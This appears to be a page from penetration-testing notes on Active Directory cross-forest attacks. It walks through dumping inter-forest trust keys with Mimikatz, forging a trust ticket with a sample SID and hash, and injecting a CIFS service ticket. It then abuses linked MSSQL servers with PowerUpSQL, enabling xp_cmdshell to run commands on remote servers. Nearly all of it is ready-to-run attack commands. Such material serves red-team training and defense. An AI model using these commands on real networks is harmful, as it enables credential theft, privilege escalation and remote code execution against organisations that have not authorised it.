---
title: Cross Forest Attacks
category: Active Directory
order: 5
---

In this section we are going to abuse trusts between forests.

# Across Forest using Trust Tickets

A trust ticket is a key which a DC of the other forest uses to decrypt the TGT presented by the attacker. That is the only check. We are going to execute a similar attack such as golden ticket but using the *trust ticket* instead of the _krbtgt_ hash.

To list the Trust tickets we can use mimikatz:

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

So an inter-forest TGT can be forged:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
```

Now we can request a TGS for `cifs` service on the dc of the trusted forest.

```powershell
.\asktgs.exe c:\temp\trust_forest_tkt.kirbi CIFS/dc01.extcorp.local
```
And inject the ticket on the current session:

```powershell
.\kirbikator.exe lsa .\CIFS.dc01.extcorp.local.kirbi
```
> **Note**: We can not list all the file system of other forest. We can only list shared folders.

```
ls \\dc01.extcorp.local\share\
```

# Trust Abuse with MSSQL Server

MSSQL Servers are generally deployed in plenty windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to dabase roles.

A fantastic tool to abuse MSSQL is `PowerUpSQLl`: 

* [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
```powershell
Import-Module .\PowerUpSQL.ps1
```

We can discover SQL servers:

```powershell
Get-SQLInstanceDomain
```

We can check accessibility:

```powershell
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
Gather information:

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## Database Links

A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of databases links between Microsoft SQL Servers, it is possible to execute stored procedures which means RCE.

Database link works even across forest trusts.

```powershell
Get-SQLServerLink -Instance mssql.corp.local -Verbose
```

So we can execute queries on the remote Server Link, see if this server has others links and above, instead of doing it manually that will be explained in a note, exists a script that crawls all the mssql server links.

```powershell
Get-SQLServerLinkCrawl -Instance mssql.corp.local -Verbose
```

> **Note**: Manual way:
>
> See if has a server link:
> `select * from master..sysservers`
>
> Openquery() function can be used to run quieries on a linked database:
> `select * from openquery('sql2.corp.local', 'select * from master..sysservers')`

To execute commands from MSSQL server we need to use `xp_cmdshell`. If `rpcout` is enabled `xp_cmdshell` can be enabled using:

```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "other-sql"
```

And finally:

```powershell
Get-SQLServerLinkCrawl -Instance mssql.corp.local -Query "exec master..xp_cmdshell 'whoami'"
```

